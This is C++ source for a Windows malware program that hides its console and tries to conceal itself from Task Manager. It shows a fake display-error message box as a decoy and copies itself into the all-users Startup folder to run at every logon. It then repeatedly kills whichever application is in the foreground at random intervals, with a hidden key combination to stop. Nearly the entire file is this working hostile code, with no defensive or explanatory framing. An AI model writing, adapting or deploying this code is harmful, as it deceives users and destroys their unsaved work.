#define _CRT_SECURE_NO_WARNINGS
#include <Windows.h>
#include <TlHelp32.h>
#include <iostream>
#include <psapi.h>
#include <time.h>
#include <filesystem>
#include <shlwapi.h>
#include <Mmsystem.h>
#include <mciapi.h>
#include <fstream>
#pragma comment(lib, "Winmm.lib")
#pragma comment (lib, "urlmon.lib")
#pragma comment(lib, "ntdll.lib")
extern "C" NTSTATUS NTAPI RtlAdjustPrivilege(ULONG Privilege, BOOLEAN Enable, BOOLEAN CurrentThread, PBOOLEAN OldValue);
extern "C" NTSTATUS NTAPI NtRaiseHardError(LONG ErrorStatus, ULONG NumberOfParameters, ULONG UnicodeStringParameterMask,
    PULONG_PTR Parameters, ULONG ValidResponseOptions, PULONG Response);
namespace fs = std::filesystem;
#define STRLEN(x) (sizeof(x)/sizeof(TCHAR) - 1)
BOOL(WINAPI* RegisterServiceProcess)(DWORD dwProcessId, DWORD dwType);

std::string getForegroundWindowProcessName()
{
    const HWND hForeground = GetForegroundWindow();
    if (hForeground)
    {
        DWORD dwPID = 0;
        GetWindowThreadProcessId(hForeground, &dwPID);
        const HANDLE hProc = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, dwPID);
        if (hProc)
        {
            TCHAR szPath[MAX_PATH];
            GetProcessImageFileName(hProc, szPath, sizeof(szPath));
            CloseHandle(hProc);
            TCHAR szTitle[MAX_PATH];
            if (GetFileTitle(szPath, szTitle, sizeof(szTitle)) == 0)
                return std::string(szTitle);
            else
                return std::string(szPath);
    }
        else
            return std::string();
}
    else
        return std::string();
}

DWORD MyGetProcessId(LPCTSTR ProcessName)
{
    PROCESSENTRY32 pt;
    HANDLE hsnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    pt.dwSize = sizeof(PROCESSENTRY32);
    if (Process32First(hsnap, &pt)) {
        do {
            if (!lstrcmpi(pt.szExeFile, ProcessName)) {
                CloseHandle(hsnap);
                return pt.th32ProcessID;
            }
        } while (Process32Next(hsnap, &pt));
    }
    CloseHandle(hsnap);
    return 0;
}

void Hide()
{
    HWND Hide;
    AllocConsole();
    Hide = FindWindowA("ConsoleWindowClass", NULL);
    ShowWindow(Hide, 0);
}

int hidefromtaskmanager() {

    HINSTANCE hKernel;
    int i = 1;
    hKernel = LoadLibrary("KERNEL32.DLL");

    if (hKernel) {
        RegisterServiceProcess = (int(__stdcall*)(DWORD, DWORD))
            GetProcAddress(hKernel, "RegisterServiceProcess");
        if (RegisterServiceProcess) {
            RegisterServiceProcess(GetCurrentProcessId(), i);
        }
        else {
            return 0;
        }
    }
    else {
        return 0;
    }
    if (RegisterServiceProcess(GetCurrentProcessId(), i)) {
    }
    return 0;
}

int random(int min, int max)
{
    srand(time(NULL) + rand());

    int temp = max - min;

    if (temp == 0)
        temp = 1;

    int value = rand() % temp + min;
    return value;
}

std::string exename()
{
    char file[MAX_PATH];
    std::string path = std::string(file, GetModuleFileName(NULL, file, MAX_PATH));
    int ind = 0;
    for (int i = (int)path.length() - 1; i >= 0; --i)
    {
        if (path[i] == '/')
        {
            ind = i + 1;
            break;
        }
    }
    return path.substr(ind);
}
void autorun()
{
    fs::path sourceFile = exename();
    fs::path targetParent = "C:/ProgramData/Microsoft/Windows/Start Menu/Programs/StartUp";
    auto target = targetParent / sourceFile.filename();
    fs::create_directories(targetParent);
    fs::copy_file(sourceFile, target, fs::copy_options::overwrite_existing);
}
void mbox()
{
    std::fstream fileStream;
    fs::path sourceFile = exename();
    std::string tocheck = "C:/ProgramData/Microsoft/Windows/Start Menu/Programs/StartUp/" + exename();
    fileStream.open(tocheck);
    if (fileStream.fail()) {
        MessageBox(0, "Error", "GUI support only 60hz", MB_OK);
    }
}
int main()
{
    Hide();
    hidefromtaskmanager();
    mbox();
    autorun();
    srand(time(NULL));
    Sleep(210000);
    bool flag = false;
    while (!flag)
    {
        if (GetAsyncKeyState('P')) {
            if (GetAsyncKeyState('O')) {
                flag = true;
            }
        }
        
        std::string str = getForegroundWindowProcessName();
        LPSTR s = const_cast<char*>(str.c_str());
        DWORD pid = MyGetProcessId(TEXT(s));
        if (pid != 0)
        {
            HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, false, pid);
            TerminateProcess(hProcess, 0);
        }
        Sleep(random(120000, 480000));
    }
    return 0;
}
